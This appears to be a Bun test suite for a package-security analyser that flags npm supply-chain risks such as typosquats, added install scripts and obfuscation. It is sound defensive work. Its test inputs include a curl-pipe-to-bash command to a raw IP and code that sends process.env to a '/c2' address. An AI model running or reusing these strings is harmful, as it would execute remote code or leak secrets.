import { test, expect } from "bun:test";
import { scanShell, scanJs, analyze, type AnalysisInput } from "../src/index.ts";

function base(overrides: Partial<AnalysisInput> = {}): AnalysisInput {
  return {
    name: "x",
    version: "1.0.0",
    isNewPackage: false,
    meta: { maintainers: ["a"], existsOnRegistry: true },
    addedScripts: {},
    changedScripts: {},
    scanFiles: [],
    ...overrides,
  };
}
const idsOf = (signals: ReturnType<typeof analyze>) => signals.map((s) => s.id);

test("scanShell detects curl-pipe and raw IP", () => {
  const f = scanShell("curl -s http://185.1.2.3/i.sh | bash");
  expect(f.some((x) => x.kind === "network")).toBe(true);
  expect(f.some((x) => x.kind === "shell_exec")).toBe(true);
  expect(f.some((x) => x.kind === "raw_ip")).toBe(true);
});

test("scanShell quiet on a normal build script", () => {
  expect(scanShell("tsc && bun test")).toHaveLength(0);
});

test("scanJs detects child_process, network, base64, env", () => {
  const kinds = scanJs("const cp=require('child_process');const h=require('https');Buffer.from(x,'base64');process.env.TOKEN;").map((f) => f.kind);
  expect(kinds).toContain("child_process");
  expect(kinds).toContain("network");
  expect(kinds).toContain("base64");
  expect(kinds).toContain("env_exfil");
});

test("scanJs quiet on plain library code", () => {
  expect(scanJs("export const add=(a,b)=>a+b;")).toHaveLength(0);
});

test("install script added is flagged as an action signal", () => {
  const s = analyze(base({ addedScripts: { postinstall: "node ./setup.js" } }));
  expect(s.some((x) => x.id === "install-script-added" && x.action)).toBe(true);
});

test("typosquat of a very popular package flags high", () => {
  const s = analyze(base({ name: "lodahs", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 47, ageDays: 0.5 } }));
  expect(idsOf(s)).toContain("typosquat");
  // newness signals present too (they will count because an action signal exists)
  expect(idsOf(s)).toContain("low-install-history");
});

test("delimiter variant (low-download squat) is only a low-weight signal", () => {
  // A squat impersonating classnames would have low downloads; that is when the
  // delimiter-variant signal applies. (An ESTABLISHED class-names is exempt — see below.)
  const s = analyze(base({ name: "class-names", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 30 } }));
  const t = s.find((x) => x.category === "typosquat");
  expect(t?.id).toBe("delimiter-variant");
  expect(t!.weight).toBeLessThan(40);
});

test("an established package is never flagged as a typosquat (got FP fix)", () => {
  const s = analyze(base({ name: "got", meta: { maintainers: ["sindresorhus"], existsOnRegistry: true, weeklyDownloads: 10_000_000 } }));
  expect(s.find((x) => x.category === "typosquat")).toBeUndefined();
});

test("nonexistent name is a slopsquat block-weight signal", () => {
  const s = analyze(base({ name: "react-codeshift", meta: { maintainers: [], existsOnRegistry: false } }));
  const slop = s.find((x) => x.category === "slopsquat");
  expect(slop?.weight).toBeGreaterThanOrEqual(80);
});

test("provenance downgrade + maintainer change flag", () => {
  const s = analyze(
    base({
      name: "axios-style",
      meta: {
        maintainers: ["attacker"],
        previousMaintainers: ["original"],
        previousHadProvenance: true,
        hasProvenance: false,
        existsOnRegistry: true,
      },
    }),
  );
  expect(idsOf(s)).toContain("provenance-downgrade");
  expect(idsOf(s)).toContain("maintainer-changed");
});

test("bare network + env (no raw IP) is NOT an action signal", () => {
  // The express/request false-positive fix: using http/https and reading env is
  // ubiquitous in legit code and must not by itself create a blocking signal.
  const s = analyze(
    base({
      name: "some-http-lib",
      meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 100 },
      scanFiles: [{ path: "index.js", text: "const https=require('https');const p=process.env.PORT;https.get('https://api.example.com');" }],
    }),
  );
  expect(s.filter((x) => x.action)).toHaveLength(0);
});

test("env dump + raw IP together IS an exfiltration signal", () => {
  const s = analyze(
    base({
      scanFiles: [{ path: "x.js", text: "const t=JSON.stringify(process.env);require('https').request('http://185.62.1.9/c2');" }],
    }),
  );
  expect(idsOf(s)).toContain("exfil-shape");
});

test("plain minification is NOT flagged as obfuscation (I4 fix)", () => {
  // Realistic long minified line: varied tokens/punctuation, mangled short
  // names, no _0x / long-base64-blob / hex-escape.
  const minified = "function f(a,b){return a+b}var c=[1,2,3,4,5],d={x:1,y:2};".repeat(150);
  const s = analyze(base({ name: "some-bundle", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 20 }, scanFiles: [{ path: "dist/b.js", text: minified }] }));
  expect(s.find((x) => x.id === "obfuscated")).toBeUndefined();
});

test("hex-identifier obfuscation IS flagged (I4 keeps true positives)", () => {
  const obf = "var _0x1a2b=['a','b'];function _0x3c(){}" + ";var q='" + "Q".repeat(900) + "';";
  const s = analyze(base({ name: "sketchy", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 20 }, scanFiles: [{ path: "index.js", text: obf }] }));
  expect(s.find((x) => x.id === "obfuscated")).toBeDefined();
});

test("clean package yields no action signals", () => {
  const s = analyze(base({ name: "tiny-slugify", meta: { maintainers: ["dev"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 400 }, scanFiles: [{ path: "index.js", text: "export const x=1;" }] }));
  expect(s.filter((x) => x.action)).toHaveLength(0);
});

test("established scoped packages are never scoped-impersonation (@types FP fix)", () => {
  for (const name of ["@types/react", "@types/lodash", "@testing-library/react"]) {
    const s = analyze(base({ name, meta: { maintainers: ["types"], existsOnRegistry: true, weeklyDownloads: 20_000_000 } }));
    expect(s.find((x) => x.id === "scoped-impersonation")).toBeUndefined();
  }
});

test("established flag alone (downloads unknown) also suppresses scoped-impersonation", () => {
  const s = analyze(base({ name: "@types/react", meta: { maintainers: ["types"], existsOnRegistry: true, established: true } }));
  expect(s.find((x) => x.id === "scoped-impersonation")).toBeUndefined();
});

test("obscure scope wrapping a mega-popular name is still scoped-impersonation", () => {
  const s = analyze(base({ name: "@typescript_eslinter/eslint", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 12 } }));
  expect(idsOf(s)).toContain("scoped-impersonation");
});

test("homoglyph squat of a top package is the strong homoglyph signal", () => {
  const s = analyze(base({ name: "l0dash", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 5 } }));
  const t = s.find((x) => x.category === "typosquat");
  expect(t?.id).toBe("homoglyph-typosquat");
  expect(t!.weight).toBeGreaterThanOrEqual(60);
});
